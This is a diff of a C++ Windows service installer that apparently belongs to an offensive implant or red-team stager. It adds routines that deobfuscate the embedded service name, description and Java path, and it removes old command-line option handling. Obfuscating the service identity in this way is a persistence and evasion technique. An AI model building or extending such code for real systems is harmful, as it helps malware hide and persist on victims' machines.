@@ -17,18 +17,6 @@
 #include "..\utilities.h"
 
 HANDLE stopEvent;
-//std::string javaPath = "";
-
-#pragma pack(push, 1)
-
-typedef void (CALLBACK *ULPWSO)(HANDLE,DWORD);
-typedef void (CALLBACK *ULPCH)(HANDLE);
-typedef void (CALLBACK *ULPEP)(UINT);
-
-//Functions for write service name to resource
-typedef HANDLE (CALLBACK *ULPBUP)(LPCSTR, BOOL);
-typedef BOOL (CALLBACK *ULPUR)(HANDLE, LPCSTR, LPCSTR, WORD, LPVOID, DWORD);
-typedef BOOL (CALLBACK *ULPEUR)(HANDLE, BOOL );
 
 //
 //	The main entry point 
@@ -36,9 +24,7 @@ typedef BOOL (CALLBACK *ULPEUR)(HANDLE, BOOL );
 int main(int argc, char* argv[]){
 
 	std::string serviceName;
-	char serviceDescription[MAX_PATH] = "";
-	//bool install = false;
-	//char* option;
+	std::string serviceDescription;
 	
 	if(argc == 1) {
 
@@ -52,9 +38,13 @@ int main(int argc, char* argv[]){
 #endif
 			return 1;
 		}
+
+        //Read the service description if it's set
+	    ReadServiceDescription( &serviceDescription );	
+
 		
 		//Install in the registry, if it works, exit
-		if( InstallService( serviceName.c_str(), serviceDescription ) )
+		if( InstallService( serviceName.c_str(), serviceDescription.c_str() ) )
 			return 0;
 
 		//Service Entry;
@@ -69,87 +59,9 @@ int main(int argc, char* argv[]){
 			Log("StartServiceCtrlDispatcher failure, error code = %d\n", GetLastError());
 #endif
 		}
-		return 0;
+
 	}
 
-	//for (int i = 1; i < argc; i++) { 
-
-	//	option = argv[i];
-	//	if(_stricmp("-i",option) == 0){
-	//		//Install the service
- //           install = true;
-	//	} else if(_stricmp("-n",option) == 0) {
-	//		
-	//		//Get the service name
-	//		if (i + 1 != argc){
-	//			serviceName.assign(argv[i + 1]);
-	//			i++;
-	//		}
-
- //       } else if(_stricmp("-d",option) == 0) {
-	//		
-	//		//Get the description
-	//		if (i + 1 != argc){
-	//			strcpy_s(serviceDescription, argv[i + 1]);
-	//			i++;
-	//		}
-	//	} else if(_stricmp("-l",option) == 0) {
-	//		
-	//		//Get the service name
-	//		ReadServiceName(&serviceName);
-	//	
-	//		//Set the java path
-	//		char javaPathArr[MAX_PATH] = "";
-	//		ReadJavaPath(javaPathArr);
-
-	//		//Get the description
-	//		printf_s("\nService Name:   %s\n", serviceName);
-	//		printf_s("\nPath:  %s\n", javaPathArr);			
-	//	
-	//	} else if(_stricmp("-j",option) == 0) {
-	//		
-	//		////Get the description
-	//		//if (i + 1 != argc){
-	//		//	javaPath = argv[i + 1];
-	//		//	i++;
-	//		//}
-
- //       } else if(_stricmp("-u",option) == 0) {
-	//		//Uninstall the service
- //           UnInstall();
-	//		return 0;
- //       } else if(_stricmp("-h",option) == 0) {
-	//		//Print help menu
- //           printf_s("\nUsage:   \"-i\"    Install\n");
-	//		printf_s("               \"-n\"    Service Name (required)\n");
-	//		printf_s("               \"-d\"    Service Description (optional)\n");
-	//		printf_s("         \"-u\"    Uninstall\n");
-	//		return 0;
- //       } else {
- //           printf_s("\nInvalid parameter %s\n", argv[i]);
-	//		printf_s("Ensure that parameters with spaces are enclosed in quotes.\n\n");
-	//	    printf_s("Usage:   \"-i\"    Install\n");
-	//		printf_s("               \"-n\"    Service Name (required)\n");
-	//		printf_s("               \"-d\"    Service Description (optional)\n");
-	//		printf_s("         \"-u\"    Uninstall\n");
-	//		return 1;
- //       }    
-	//}
-	//
-	////Ensure all required options were provided
-	//if( install ){
-	//
-	//	if( serviceName.empty() ){
-	//		printf_s("Service name is required.  Aborting");		        
-	//		return 1;
-	//	}
-
-	//	//Install in the registry
-	//	Install( serviceName.c_str(), serviceDescription );
-
-	//	//Update the string table with the service name
- //		//UpdateResourceFile( serviceName, javaPath );
-	//}
 
 }
 
@@ -195,15 +107,39 @@ void ExtractStager( char* passedPath ){
 void ReadServiceName( std::string* svcName ) {	
 	char serviceName[MAX_PATH];
 	LoadString(NULL, IDS_NAME, serviceName, MAX_PATH );	
-	svcName->assign(serviceName);
+
+	//Deobfuscate it
+	char *reg_ptr = decode_split(serviceName, 200);
+	svcName->assign(reg_ptr);
+	free(reg_ptr);
 }
 
 //=========================================================================
 /**
-	Attempt to get the service name embedded in the file
+	Attempt to get the service description embedded in the file
 */
-void ReadJavaPath( char* passedPath ) {	
-	LoadString(NULL, IDS_PATH, passedPath, MAX_PATH );	
+void ReadServiceDescription( std::string* svcDesc ) {	
+	char serviceDesc[MAX_PATH];
+	LoadString(NULL, IDS_DESCRIPTION, serviceDesc, MAX_PATH );	
+
+	//Deobfuscate it
+	char *tmp_ptr = decode_split(serviceDesc, 200);
+	svcDesc->assign(tmp_ptr);
+	free(tmp_ptr);
+}
+
+//=========================================================================
+/**
+	Attempt to get the java path embedded in the file
+*/
+void ReadJavaPath( std::string* passedPath ) {	
+	char javaPath[MAX_PATH];
+	LoadString(NULL, IDS_PATH, javaPath, MAX_PATH );	
+
+	//Deobfuscate it
+	char *tmp_ptr = decode_split(javaPath, 200);
+	passedPath->assign(tmp_ptr);
+	free(tmp_ptr);
 }
 
 
@@ -211,7 +147,7 @@ void ReadJavaPath( char* passedPath ) {
 /**
 	Installs the service
 */
-bool InstallService( const char* serviceName, char* serviceDesc ){
+bool InstallService( const char* serviceName, const char* serviceDesc ){
 
 	char pPath[MAX_PATH];
 	bool installed_svc = false;
@@ -222,7 +158,7 @@ bool InstallService( const char* serviceName, char* serviceDesc ){
 	SERVICE_DESCRIPTION sd;
 	
 	//Set the description
-	sd.lpDescription = serviceDesc;
+	sd.lpDescription = (LPSTR)serviceDesc;
 	SC_HANDLE schSCManager = OpenSCManager( NULL, NULL, SC_MANAGER_CREATE_SERVICE); 
 	if (schSCManager==0) {
 		printf_s("OpenSCManager failed, error code = %d\n", GetLastError());
